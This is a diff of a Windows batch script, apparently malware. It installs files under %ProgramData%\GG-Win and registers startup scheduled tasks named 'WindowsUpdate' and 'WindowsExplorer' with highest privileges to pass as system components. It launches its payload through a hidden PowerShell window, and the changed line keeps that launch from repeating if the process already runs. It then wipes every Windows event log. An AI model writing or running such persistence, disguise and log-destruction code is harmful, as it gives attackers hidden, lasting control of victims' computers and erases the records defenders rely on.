@@ -35,6 +35,6 @@ schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  
 start %programdata%\GG-Win\WindowsExplorer.exe
 copy %TEMP%\WindowsExplorer.bat %ProgramData%\GG-Win\WindowsExplorer.bat /Y
 schtasks /create /tn WindowsExplorer /ru "%username%" /sc ONSTART /DELAY 0000:30 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
-powershell -WindowStyle Hidden -Command "Start-Process '%ProgramData%\GG-Win\WindowsExplorer.bat' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "if (-not (Get-Process -Name 'WindowsExplorer' -ErrorAction SilentlyContinue)) {Start-Process '%ProgramData%\GG-Win\WindowsExplorer.bat' -WindowStyle Hidden}"
 echo -----------delete-evnt-log-------------------------------------------
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
